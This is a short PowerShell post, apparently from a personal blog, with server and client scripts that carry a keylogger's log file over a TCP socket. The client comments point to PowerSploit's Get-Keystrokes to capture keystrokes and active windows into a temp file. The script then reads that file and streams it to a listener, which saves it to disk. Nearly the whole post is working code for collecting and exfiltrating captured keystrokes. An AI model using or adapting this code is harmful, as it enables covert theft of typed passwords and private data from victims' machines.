# Transfer keylogger log file between server and client (Sockets TCP)
## Network, PowerShell, Security 
### URL: https://www.jesusninoc.com/2015/07/16/transfer-keylogger-log-file-between-server-and-client-sockets-tcp/
```PowerShell
##Server
$port=2050
$IPEndPoint=New-Object System.Net.IPEndPoint([IPAddress]::Any,$port)
$TcpListener=New-Object System.Net.Sockets.TcpListener $IPEndPoint
$TcpListener.Start()

$AcceptTcpClient=$TcpListener.AcceptTcpClient()
$GetStream=$AcceptTcpClient.GetStream()
$StreamReader=New-Object System.IO.StreamReader $GetStream

$ReadAllLines = $StreamReader.ReadToEnd()
$Bytes = ([system.Text.Encoding]::Default).GetBytes($ReadAllLines)
[System.IO.File]::WriteAllBytes('F:\power\keycopy.log',$Bytes)

$StreamReader.Dispose()
$GetStream.Dispose()
$AcceptTcpClient.Dispose()
$TcpListener.Stop()

```
```PowerShell
##Client
#Important:
#Execute Get-Keystrokes (Logs keys pressed, time and the active window).
#https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1
#By default, keystrokes are logged to '$($Env:TEMP)\key.log'
$port=2050
$TcpClient=New-Object System.Net.Sockets.TcpClient([IPAddress]::Loopback, $port)

$GetStream = $TcpClient.GetStream()
$StreamWriter = New-Object System.IO.StreamWriter $GetStream

$Bytes = [System.IO.File]::ReadAllBytes("$($Env:TEMP)\key.log")
$StreamWriter.Write($Bytes,0,$Bytes.length)

$StreamWriter.Dispose()
$GetStream.Dispose()
$TcpClient.Dispose()

```
